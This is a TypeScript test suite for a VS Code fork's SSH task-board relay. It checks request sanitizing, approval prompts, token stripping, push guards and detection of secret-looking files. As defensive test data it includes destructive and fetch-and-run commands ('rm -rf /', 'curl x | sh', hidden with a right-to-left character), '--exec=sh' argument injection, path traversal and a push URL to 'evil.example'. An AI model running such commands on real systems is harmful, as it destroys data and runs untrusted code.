/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// allow-any-unicode-comment-file (Para Code: this file contains Japanese PARA-CODE comments)

// PARA-CODE: fork-owned file (Para Code) — not present in upstream microsoft/vscode. See CLAUDE.md.

import assert from 'assert';
import { VSBuffer } from '../../../../../base/common/buffer.js';
import { Emitter, Event } from '../../../../../base/common/event.js';
import { URI } from '../../../../../base/common/uri.js';
import { IChannel } from '../../../../../base/parts/ipc/common/ipc.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { paradisParseTaskBoardBoardRegistration, paradisParseTaskBoardRelayRequest, paradisTaskBoardRelayOperationName } from '../../common/paradisTaskBoardRelay.js';
import { IParadisTaskBoardRelayApproval, IParadisTaskBoardRelayCommandConfirmation, IParadisTaskBoardRelayPushConfirmation, IParadisTaskBoardRelayRecord, ParadisTaskBoardRelaySessions, paradisTaskBoardRelayIsSuspiciousFile } from '../../common/paradisTaskBoardRelaySessions.js';

const KEY = 'k'.repeat(43);
const SESSION = 'session-0123456789abcdef';
const AUTHORITY = 'ssh-remote+host';
const ROOT = '/home/u/repo';
const WORKTREES = '/home/u/repo-worktrees';
const REPO = URI.from({ scheme: 'vscode-remote', authority: AUTHORITY, path: ROOT });

/** REH や接続口の代わり。届いた呼び出しを記録し、決めた答えを返す。 */
class FakeChannel implements IChannel {
	readonly calls: { command: string; arg: unknown }[] = [];
	readonly output = new Emitter<{ runId: string; lines: string[] }>();
	constructor(private readonly answer: (command: string, arg: unknown) => unknown) { }
	async call<T>(command: string, arg?: unknown): Promise<T> {
		this.calls.push({ command, arg });
		const value = this.answer(command, arg);
		if (value instanceof Error) {
			throw value;
		}
		return value as T;
	}
	listen<T>(event: string): Event<T> {
		return event === 'onOutput' ? this.output.event as unknown as Event<T> : Event.None;
	}
}

function defaultReh(command: string, arg: unknown): unknown {
	switch (command) {
		case 'openSession': {
			const path = (arg as string[])[1];
			return { toplevel: path, commonDir: `${ROOT}/.git` };
		}
		case 'readFile': return VSBuffer.fromString('plan');
		case 'adoptWorktree': return (arg as string[])[1].endsWith('/gone') ? new Error('[denied] gone') : undefined;
		case 'git': {
			const op = (arg as unknown[])[2] as { kind: string; push?: boolean };
			if (op.kind === 'remoteUrl') {
				return { code: 0, stdout: op.push ? 'git@example.com:o/r.git\n' : 'https://user:token@example.com/o/r.git\n', stderr: '', timedOut: false };
			}
			if (op.kind === 'defaultBranch') {
				return { code: 0, stdout: 'refs/remotes/origin/main\n', stderr: '', timedOut: false };
			}
			return { code: 0, stdout: 'x', stderr: '', timedOut: false };
		}
		default: return undefined;
	}
}

suite('Paradis task board relay - window side', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	function create(options?: { remoteAuthority?: string | null; registered?: boolean; reh?: (command: string, arg: unknown) => unknown; record?: IParadisTaskBoardRelayRecord; confirm?: 'once' | 'remember' | 'deny'; confirmPush?: (request: IParadisTaskBoardRelayPushConfirmation) => Promise<'once' | 'remember' | 'deny'>; tools?: 'remember' | 'deny' }) {
		const reh = new FakeChannel(options?.reh ?? defaultReh);
		const bridge = new FakeChannel(() => true);
		store.add(reh.output);
		const records = new Map<string, IParadisTaskBoardRelayRecord>(options?.record ? [[REPO.toString(), options.record]] : []);
		const approvals = new Map<string, IParadisTaskBoardRelayApproval>();
		const confirmations: IParadisTaskBoardRelayCommandConfirmation[] = [];
		const pushConfirmations: IParadisTaskBoardRelayPushConfirmation[] = [];
		const toolConfirmations: string[] = [];
		const sessions = store.add(new ParadisTaskBoardRelaySessions({
			remoteAuthority: options?.remoteAuthority === null ? undefined : options?.remoteAuthority ?? AUTHORITY,
			remoteChannel: () => reh,
			bridge,
			isWindowFolder: () => options?.registered ?? true,
			newSessionId: () => SESSION,
			readRecord: repository => records.get(repository) ?? { worktrees: [], branches: [] },
			writeRecord: (repository, record) => records.set(repository, record),
			readApproval: key => approvals.get(key),
			writeApproval: (key, approval) => approvals.set(key, approval),
			confirmCommand: async request => {
				confirmations.push(request);
				return options?.confirm ?? 'remember';
			},
			sha256: async text => `h:${text}`,
			confirmPush: async request => {
				pushConfirmations.push(request);
				return options?.confirmPush ? options.confirmPush(request) : 'remember';
			},
			confirmLaunchTools: async request => {
				toolConfirmations.push(request.agent);
				return options?.tools ?? 'remember';
			},
			warn: () => { },
		}));
		return { sessions, reh, bridge, records, confirmations, pushConfirmations, toolConfirmations };
	}

	async function opened(options?: Parameters<typeof create>[0]) {
		const created = create(options);
		assert.deepStrictEqual(await created.sessions.prepare(REPO), { ok: true, value: { sessionId: SESSION, root: ROOT } });
		assert.deepStrictEqual(await created.sessions.bind(SESSION, KEY), { ok: true, value: true });
		return created;
	}

	const code = (result: { ok: boolean; code?: string }) => result.ok ? 'ok' : result.code;

	test('board registration and request shapes', () => {
		assert.deepStrictEqual([
			paradisParseTaskBoardBoardRegistration({ pid: 1234, key: KEY }),
			paradisParseTaskBoardBoardRegistration({ pid: 1, key: KEY }),
			paradisParseTaskBoardBoardRegistration({ pid: 1234, key: 'short' }),
			paradisTaskBoardRelayOperationName({ op: { kind: 'git', git: { kind: 'status' } } }),
			paradisTaskBoardRelayOperationName({ op: { kind: 'git', git: { kind: '<script>' } } }),
		], [{ pid: 1234, key: KEY }, undefined, undefined, 'git.status', 'git.unknown']);
	});

	test('requests are rebuilt from the allowed fields only; pushes go only through pushBranch', () => {
		const parse = (op: unknown) => {
			const result = paradisParseTaskBoardRelayRequest({ sessionId: SESSION, op, extra: 'x' });
			return result.ok ? result.value.op : result.code;
		};
		assert.deepStrictEqual([
			parse({ kind: 'git', place: ROOT, git: { kind: 'status', args: ['--output=/tmp/x'], cwd: '/etc' }, cwd: '/etc' }),
			parse({ kind: 'git', place: ROOT, git: { kind: 'worktreeAdd', dir: `${WORKTREES}/a`, branch: 'para/a', mode: 'new', base: { kind: 'remote', branch: 'main', x: 1 }, force: true } }),
			parse({ kind: 'git', place: ROOT, git: { kind: 'switch', branch: 'para/a', mode: 'existing', base: { kind: 'head' } } }),
			parse({ kind: 'git', git: { kind: 'status' } }),
			parse({ kind: 'git', place: ROOT, git: { kind: 'push', branch: 'para/x' } }),
			parse({ kind: 'git', place: ROOT, git: { kind: 'commit', message: 'x' } }),
			parse({ kind: 'git', place: ROOT, git: { kind: 'addTracked' } }),
			parse({ kind: 'runCommand', command: 'rm -rf /' }),
			parse({ kind: 'readFile', place: ROOT, path: '.env' }),
			parse({ kind: 'writeFile', path: '.para-code/paracode.json', content: '{}', place: '/etc' }),
			parse({ kind: 'writeFile', path: 'package.json', content: '{}' }),
			parse({ kind: 'resetBoardDir', place: ROOT, taskId: '../x' }),
		], [
			{ kind: 'git', place: ROOT, git: { kind: 'status' } },
			{ kind: 'git', place: ROOT, git: { kind: 'worktreeAdd', dir: `${WORKTREES}/a`, branch: 'para/a', mode: 'new', base: { kind: 'remote', branch: 'main' } } },
			{ kind: 'git', place: ROOT, git: { kind: 'switch', branch: 'para/a', mode: 'existing' } },
			// 工程のコマンドは、欄が揃わない（place・runId・step が無い）ので断る
			'invalid', 'unavailable',
			{ kind: 'git', place: ROOT, git: { kind: 'commit', message: 'x' } },
			{ kind: 'git', place: ROOT, git: { kind: 'addTracked' } },
			'invalid', 'rejected',
			{ kind: 'writeFile', path: '.para-code/paracode.json', content: '{}' },
			'rejected', 'invalid',
		]);
	});

	test('a session opens only for a registered repository on the SSH host of this window', async () => {
		const other = URI.from({ scheme: 'vscode-remote', authority: 'ssh-remote+other', path: ROOT });
		assert.deepStrictEqual([
			code(await create({ remoteAuthority: null }).sessions.prepare(REPO)),
			code(await create().sessions.prepare(other)),
			code(await create().sessions.prepare(URI.file(ROOT))),
			code(await create({ registered: false }).sessions.prepare(REPO)),
			code(await create({ reh: () => new Error('Unknown channel: paradisTaskBoardRemote') }).sessions.prepare(REPO)),
		], ['invalid', 'invalid', 'invalid', 'invalid', 'unavailable']);
		const { sessions, reh, bridge } = create();
		await sessions.prepare(REPO);
		// 鍵を結ぶまでは依頼を受けない
		assert.strictEqual(code(await sessions.handle({ sessionId: SESSION, op: { kind: 'sessionInfo' } })), 'not-found');
		assert.strictEqual(code(await sessions.bind(SESSION, 'short')), 'invalid');
		await sessions.bind(SESSION, KEY);
		// git の呼び出しは、セッションを開いたときに origin と既定のブランチを固定する分（ここでは見ない）
		assert.deepStrictEqual([reh.calls.filter(call => call.command !== 'git'), bridge.calls], [
			[{ command: 'openSession', arg: [SESSION, ROOT] }, { command: 'closeSession', arg: [SESSION] }, { command: 'openSession', arg: [SESSION, ROOT, WORKTREES] }],
			[{ command: 'registerRelaySession', arg: { sessionId: SESSION, boardKey: KEY, authority: AUTHORITY, repository: ROOT } }],
		]);
	});

	test('a session opened from a worktree folder moves to the main repository, if the window has it', async () => {
		const worktree = REPO.with({ path: `${WORKTREES}/x` });
		const registered = create();
		const result = await registered.sessions.prepare(worktree);
		const missing = create({ registered: false });
		// 窓に本体が無ければ断る（最初の確かめは通すため、isWindowFolder は本体のときだけ false にする）
		const onlyWorktree = new ParadisTaskBoardRelaySessions({
			remoteAuthority: AUTHORITY, remoteChannel: () => new FakeChannel(defaultReh), bridge: new FakeChannel(() => true),
			isWindowFolder: uri => uri.path !== ROOT, newSessionId: () => SESSION,
			readRecord: () => ({ worktrees: [], branches: [] }), writeRecord: () => { }, warn: () => { },
			readApproval: () => undefined, writeApproval: () => { }, confirmCommand: async () => 'deny', sha256: async text => text,
			confirmPush: async () => 'deny', confirmLaunchTools: async () => 'deny',
		});
		store.add(onlyWorktree);
		assert.deepStrictEqual([
			result.ok ? result.value.root : result.code,
			registered.reh.calls.filter(call => call.command === 'openSession').map(call => call.arg),
			code(await missing.sessions.prepare(worktree)),
			code(await onlyWorktree.prepare(worktree)),
		], [ROOT, [[SESSION, `${WORKTREES}/x`], [SESSION, ROOT, WORKTREES]], 'invalid', 'invalid']);
	});

	test('tokens in git output are removed anywhere in the text', async () => {
		const { sessions } = await opened({ reh: (command, arg) => command === 'git' ? { code: 128, stdout: '', stderr: `fatal: unable to access 'https://user:p@ss@example.com/o/r.git/': 403\n`, timedOut: false } : defaultReh(command, arg) });
		const result = await sessions.handle({ sessionId: SESSION, op: { kind: 'git', place: ROOT, git: { kind: 'fetch' } } });
		assert.deepStrictEqual(result.ok ? (result.value as { stderr: string }).stderr : result.code, `fatal: unable to access 'https://example.com/o/r.git/': 403\n`);
	});

	test('session info comes from the window, with the credentials removed from the origin URL', async () => {
		const { sessions } = await opened({ record: { worktrees: [{ dir: `${WORKTREES}/kept`, branch: 'para/kept' }, { dir: `${WORKTREES}/gone`, branch: 'para/gone' }], branches: [] } });
		const info = await sessions.handle({ sessionId: SESSION, op: { kind: 'sessionInfo' } });
		assert.deepStrictEqual(info.ok ? info.value : info.code, {
			root: ROOT, worktreeRoot: WORKTREES, defaultBranch: 'main',
			originFetch: 'https://example.com/o/r.git', originPush: 'git@example.com:o/r.git',
			worktrees: [`${WORKTREES}/kept`],
		});
	});

	test('workspaces are the session root and the worktrees this window made, recorded across restarts', async () => {
		const { sessions, reh, records } = await opened();
		const before = reh.calls.filter(call => call.command === 'git').length;
		const git = (place: string, op: unknown) => sessions.handle({ sessionId: SESSION, op: { kind: 'git', place, git: op } });
		const dir = `${WORKTREES}/7-feature`;
		const results = [
			code(await git('/etc', { kind: 'status' })),
			code(await git(ROOT, { kind: 'worktreeAdd', dir: '/tmp/7-feature', branch: 'para/7', mode: 'new', base: { kind: 'head' } })),
			code(await git(dir, { kind: 'status' })),
			sessions.launchTarget(SESSION, dir)?.toString(),
			code(await git(ROOT, { kind: 'worktreeAdd', dir, branch: 'para/7-feature', mode: 'new', base: { kind: 'remote', branch: 'main' } })),
			code(await git(dir, { kind: 'status' })),
			sessions.launchTarget(SESSION, dir)?.toString(),
			sessions.launchTarget(SESSION, dir.toUpperCase()),
			code(await git(ROOT, { kind: 'worktreeRemove', dir: ROOT })),
		];
		assert.deepStrictEqual({ results, record: records.get(REPO.toString()), sentToReh: reh.calls.filter(call => call.command === 'git').length - before }, {
			results: ['rejected', 'rejected', 'rejected', undefined, 'ok', 'ok', `vscode-remote://ssh-remote%2Bhost${dir}`, undefined, 'rejected'],
			record: { worktrees: [{ dir, branch: 'para/7-feature' }], branches: ['para/7-feature'] },
			sentToReh: 2,
		});
	});

	test('branch switches and board folder resets happen only in board worktrees, not in the main working tree', async () => {
		const { sessions } = await opened({ record: { worktrees: [{ dir: `${WORKTREES}/kept`, branch: 'para/kept' }], branches: [] } });
		const run = (place: string, op: unknown) => sessions.handle({ sessionId: SESSION, op });
		assert.deepStrictEqual([
			code(await run(ROOT, { kind: 'git', place: ROOT, git: { kind: 'switch', branch: 'para/x', mode: 'existing' } })),
			code(await run(ROOT, { kind: 'git', place: ROOT, git: { kind: 'detach', base: { kind: 'remote', branch: 'main' } } })),
			code(await run(ROOT, { kind: 'git', place: ROOT, git: { kind: 'mergeFfOnly', branch: 'para/x' } })),
			code(await run(ROOT, { kind: 'resetBoardDir', place: ROOT, taskId: 't1' })),
			code(await run(ROOT, { kind: 'git', place: `${WORKTREES}/kept`, git: { kind: 'switch', branch: 'para/kept', mode: 'existing' } })),
		], ['rejected', 'rejected', 'rejected', 'rejected', 'ok']);
	});

	test('the window sends only the rebuilt operation to the SSH host', async () => {
		const { sessions, reh } = await opened();
		const results = [
			await sessions.handle({ sessionId: SESSION, op: { kind: 'git', place: ROOT, git: { kind: 'status', args: ['--exec=sh'] } } }),
			await sessions.handle({ sessionId: SESSION, op: { kind: 'readFile', place: ROOT, path: '.para/plan.html' } }),
			await sessions.handle({ sessionId: 'session-ffffffffffffffff', op: { kind: 'git', place: ROOT, git: { kind: 'status' } } }),
		];
		assert.deepStrictEqual({
			results: results.map(result => result.ok ? result.value : result.code),
			sent: reh.calls.filter(call => call.command === 'readFile' || (call.command === 'git' && ((call.arg as unknown[])[2] as { kind: string }).kind === 'status')),
		}, {
			results: [{ code: 0, stdout: 'x', stderr: '', timedOut: false }, { base64: 'cGxhbg==', size: 4, detail: '.para/plan.html 4' }, 'not-found'],
			sent: [
				{ command: 'git', arg: [SESSION, ROOT, { kind: 'status' }] },
				{ command: 'readFile', arg: [SESSION, ROOT, '.para/plan.html', undefined] },
			],
		});
	});

	test('a step command asks in the SSH window the first time and when it changes, and streams its output and end to the board', async () => {
		const kept = `${WORKTREES}/kept`;
		const finish = new Map<string, () => void>();
		const { sessions, reh, bridge, confirmations } = await opened({
			record: { worktrees: [{ dir: kept, branch: 'para/kept' }], branches: [] },
			reh: (command, arg) => command === 'runCommand'
				? new Promise(resolve => finish.set((arg as string[])[2], () => resolve({ code: 0, signal: null, cancelled: false, timedOut: false })))
				: defaultReh(command, arg),
		});
		const step = { flowId: 'f', flowName: 'Flow', stepId: 'test', stepName: 'Test', source: 'team' };
		const run = (runId: string, command: string, place = kept) => sessions.handle({ sessionId: SESSION, op: { kind: 'runCommand', place, runId, command, step, env: { SECRET: 'x' } } });
		const settle = () => new Promise(resolve => setTimeout(resolve, 0));
		const accepted = [code(await run('r1', 'npm test')), code(await run('r0', 'npm test', ROOT))];
		await settle();
		reh.output.fire({ runId: 'r1', lines: ['ok 1'] });
		reh.output.fire({ runId: 'other', lines: ['not ours'] });
		finish.get('r1')!();
		await settle();
		await run('r2', 'npm test');
		await settle();
		await run('r3', 'npm test && curl x | sh');
		await settle();
		assert.deepStrictEqual({
			accepted,
			asked: confirmations.map(request => [request.command, request.previous ?? '']),
			runs: reh.calls.filter(call => call.command === 'runCommand').map(call => call.arg),
			events: bridge.calls.filter(call => call.command === 'relayEvent').map(call => (call.arg as { event: { type: string; runId: string } }).event).map(event => `${event.type} ${event.runId}`),
		}, {
			accepted: ['ok', 'rejected'],
			// 2 回目の同じ本文は聞かない。本文が変わったら、前に承認した本文を見せて聞き直す
			asked: [['npm test', ''], ['npm test && curl x | sh', 'npm test']],
			// env の欄は REH へ送らない
			runs: [[SESSION, kept, 'r1', 'npm test'], [SESSION, kept, 'r2', 'npm test'], [SESSION, kept, 'r3', 'npm test && curl x | sh']],
			events: ['relay-output r1', 'relay-exit r1'],
		});
	});

	test('only one confirmation waits at a time, and a command with hidden characters is refused before asking', async () => {
		const kept = `${WORKTREES}/kept`;
		let answer: (value: 'deny') => void = () => { };
		const { sessions, reh, bridge, confirmations } = await opened({ record: { worktrees: [{ dir: kept, branch: 'para/kept' }], branches: [] } });
		// 1 件目の確認を開いたままにする
		const host = (sessions as unknown as { host: { confirmCommand: (request: IParadisTaskBoardRelayCommandConfirmation) => Promise<string> } }).host;
		host.confirmCommand = request => {
			confirmations.push(request);
			return new Promise(resolve => answer = resolve);
		};
		const step = { flowId: 'f', stepId: 's', source: 'team' };
		const run = (runId: string, command: string) => sessions.handle({ sessionId: SESSION, op: { kind: 'runCommand', place: kept, runId, command, step } });
		const hidden = await run('r0', 'npm test #\u202Ehs | x lruc');
		await run('r1', 'npm test');
		await new Promise(resolve => setTimeout(resolve, 0));
		await run('r2', 'npm run lint');
		await new Promise(resolve => setTimeout(resolve, 0));
		answer('deny');
		await new Promise(resolve => setTimeout(resolve, 0));
		assert.deepStrictEqual({
			hidden: hidden.ok ? 'ok' : [hidden.code, hidden.message],
			asked: confirmations.map(request => [request.command, request.hash]),
			exits: bridge.calls.filter(call => call.command === 'relayEvent').map(call => (call.arg as { event: { runId: string; reason?: string } }).event).map(event => `${event.runId} ${event.reason}`),
			runs: reh.calls.filter(call => call.command === 'runCommand').length,
		}, {
			hidden: ['rejected', 'The command contains characters that cannot be displayed, so it is not run.'],
			asked: [['npm test', 'h:npm test']],
			exits: ['r2 confirm-pending', 'r1 not-approved'],
			runs: 0,
		});
	});

	test('a step command that the person does not approve never reaches the SSH host', async () => {
		const kept = `${WORKTREES}/kept`;
		const { sessions, reh, bridge } = await opened({ record: { worktrees: [{ dir: kept, branch: 'para/kept' }], branches: [] }, confirm: 'deny' });
		await sessions.handle({ sessionId: SESSION, op: { kind: 'runCommand', place: kept, runId: 'r1', command: 'rm -rf ~', step: { flowId: 'f', stepId: 's', source: 'personal' } } });
		await new Promise(resolve => setTimeout(resolve, 0));
		assert.deepStrictEqual({
			runs: reh.calls.filter(call => call.command === 'runCommand').length,
			exit: bridge.calls.filter(call => call.command === 'relayEvent').map(call => (call.arg as { event: object }).event),
		}, { runs: 0, exit: [{ type: 'relay-exit', runId: 'r1', code: null, signal: null, cancelled: false, timedOut: false, reason: 'not-approved' }] });
	});

	suite('push', () => {
		const kept = `${WORKTREES}/kept`;
		const SHA1 = 'a'.repeat(40);
		const SHA2 = 'b'.repeat(40);

		/** push の確かめに使う REH の答え。`state` を書き換えて、確認の間の変化を再現する。 */
		function pushReh(state: { head: string; pushUrl: string; subjects: string; files: string; mirror?: string }) {
			return (command: string, arg: unknown) => {
				if (command !== 'git') {
					return defaultReh(command, arg);
				}
				const op = (arg as unknown[])[2] as { kind: string; push?: boolean };
				const out = (stdout: string, code = 0) => ({ code, stdout, stderr: '', timedOut: false });
				switch (op.kind) {
					case 'headSha': return out(`${state.head}\n`);
					case 'remoteUrl': return out(op.push ? `${state.pushUrl}\n` : 'https://example.com/o/r.git\n');
					case 'remoteMirror': return state.mirror === undefined ? out('', 1) : out(`${state.mirror}\n`);
					case 'defaultBranch': return out('refs/remotes/origin/main\n');
					case 'refExists': return out('', 1);
					case 'commitSubjects': return out(state.subjects);
					case 'changedFiles': return out(state.files);
					case 'push': return out('');
					default: return out('');
				}
			};
		}

		async function setup(branch: string, extra?: Parameters<typeof create>[0]) {
			const state: { head: string; pushUrl: string; subjects: string; files: string; mirror?: string } = { head: SHA1, pushUrl: 'git@example.com:o/r.git', subjects: `${SHA1} change a\n`, files: 'a.txt\0' };
			const created = await opened({ record: { worktrees: [{ dir: kept, branch: 'para/kept' }], branches: ['para/kept'] }, reh: pushReh(state), ...extra });
			let n = 0;
			const push = async (interactive = true) => {
				const runId = `p${++n}`;
				await created.sessions.handle({ sessionId: SESSION, op: { kind: 'pushBranch', place: kept, runId, branch, setUpstream: true, interactive } });
				await new Promise(resolve => setTimeout(resolve, 0));
				const exit = created.bridge.calls.map(call => (call.arg as { event?: { runId: string; reason?: string; code: number | null } }).event).find(event => event?.runId === runId);
				return exit?.reason ?? (exit?.code === 0 ? 'pushed' : String(exit?.code));
			};
			const pushes = () => created.reh.calls.filter(call => call.command === 'git' && ((call.arg as unknown[])[2] as { kind: string }).kind === 'push').map(call => (call.arg as unknown[])[2]);
			return { ...created, state, push, pushes };
		}

		test('sends the commit that was shown, even when HEAD moves while the dialog is open', async () => {
			const holder: { state?: { head: string } } = {};
			const { push, pushes, pushConfirmations, state } = await setup('para/kept', {
				confirmPush: async () => {
					holder.state!.head = SHA2;
					return 'remember';
				},
			});
			holder.state = state;
			assert.deepStrictEqual([await push(), pushes(), pushConfirmations.map(request => [request.sha, request.commits, request.files, request.canRemember])], [
				'pushed',
				[{ kind: 'push', branch: 'para/kept', setUpstream: true, defaultBranch: 'main', source: SHA1 }],
				[[SHA1, [`${SHA1} change a`], ['a.txt'], true]],
			]);
		});

		test('an approved board branch is not asked again, but board files and hidden characters are always refused', async () => {
			const { push, pushes, pushConfirmations, state } = await setup('para/kept');
			const first = await push();
			state.head = SHA2;
			const second = await push();
			state.files = 'a.txt\0.para/plan.html\0';
			const withBoardFiles = await push();
			state.files = 'a.txt\0';
			state.subjects = `${SHA2} fix \u202Ehs.x\n`;
			const hidden = await push();
			assert.deepStrictEqual([first, second, withBoardFiles, hidden, pushConfirmations.length, pushes().length], ['pushed', 'pushed', 'board-files-in-commits', 'hidden-characters', 1, 2]);
		});

		test('a changed push URL is refused, and a branch the board did not make is asked every time without remember', async () => {
			const own = await setup('para/kept');
			own.state.pushUrl = 'git@evil.example:o/r.git';
			const other = await setup('feature/x');
			assert.deepStrictEqual([
				await own.push(),
				await other.push(),
				await other.push(),
				other.pushConfirmations.map(request => request.canRemember),
			], ['push-url-changed', 'pushed', 'pushed', [false, false]]);
		});

		test('a second push URL or a mirror setting is refused, and a branch the board did not make is asked even with no commits', async () => {
			const twoUrls = await setup('para/kept');
			// 担当が pushurl を足した（get-url --push --all が 2 本を返す）
			twoUrls.state.pushUrl = 'git@example.com:o/r.git\ngit@evil.example:o/r.git';
			const mirror = await setup('para/kept');
			mirror.state.mirror = 'true';
			const empty = await setup('feature/new');
			empty.state.subjects = '';
			empty.state.files = '';
			assert.deepStrictEqual([
				await twoUrls.push(), await mirror.push(), await empty.push(),
				empty.pushConfirmations.map(request => [request.commits.length, request.canRemember]),
				twoUrls.pushes().length + mirror.pushes().length,
			], ['push-url-changed', 'push-mirror', 'pushed', [[0, false]], 0]);
		});

		test('every push leaves the sent SHA and count in the end event', async () => {
			const { push, bridge } = await setup('para/kept');
			await push();
			const exit = bridge.calls.map(call => (call.arg as { event?: { type: string; pushedSha?: string; pushedCommits?: number } }).event).find(event => event?.type === 'relay-exit');
			assert.deepStrictEqual([exit?.pushedSha, exit?.pushedCommits], [SHA1, 1]);
		});

		test('secret-looking names, but not the env templates', () => {
			const names = ['.env', 'config/.env.local', '.env.example', 'app/.env.sample', '.env.template', '.git-credentials', 'gcp/credentials.json', 'infra/terraform.tfstate', 'kubeconfig', 'keys/service-account-prod.json', 'id_ed25519', 'certs/server.pem', 'src/app.ts', 'README.md'];
			assert.deepStrictEqual(names.filter(paradisTaskBoardRelayIsSuspiciousFile), ['.env', 'config/.env.local', '.git-credentials', 'gcp/credentials.json', 'infra/terraform.tfstate', 'kubeconfig', 'keys/service-account-prod.json', 'id_ed25519', 'certs/server.pem']);
		});

		test('a push on release never asks, and secret-looking files make an approved branch ask again', async () => {
			const { push, pushConfirmations, state } = await setup('para/kept');
			const onRelease = await push(false);
			await push();
			state.files = 'a.txt\0config/.env\0';
			await push();
			assert.deepStrictEqual([onRelease, pushConfirmations.map(request => request.suspicious)], ['needs-confirmation', [[], ['config/.env']]]);
		});
	});

	test('tool approvals at launch are asked once per repository and built by the window', async () => {
		const { sessions, toolConfirmations } = await opened();
		const denied = await opened({ tools: 'deny' });
		assert.deepStrictEqual({
			first: await sessions.launchApprovalFlags(SESSION, 'claude'),
			second: (await sessions.launchApprovalFlags(SESSION, 'codex'))?.split(' -c ').length,
			asked: toolConfirmations,
			denied: await denied.sessions.launchApprovalFlags(SESSION, 'claude'),
		}, {
			first: `'--allowedTools=mcp__para-browser__board_complete_step,mcp__para-browser__board_ask_human,mcp__para-browser__list_browser_tabs,mcp__para-browser__get_shared_page,mcp__para-browser__take_screenshot,mcp__para-browser__capture_screenshot,mcp__para-browser__take_snapshot,mcp__para-browser__get_text,mcp__para-browser__inspect_element'`,
			second: 9,
			asked: ['claude'],
			denied: undefined,
		});
	});

	test('errors from the SSH host keep their meaning', async () => {
		const { sessions } = await opened({ reh: (command, arg) => command === 'readFile' ? new Error('[denied] the path goes through a symbolic link: x') : defaultReh(command, arg) });
		const result = await sessions.handle({ sessionId: SESSION, op: { kind: 'readFile', place: ROOT, path: '.para/x' } });
		assert.strictEqual(code(result), 'rejected');
	});
});
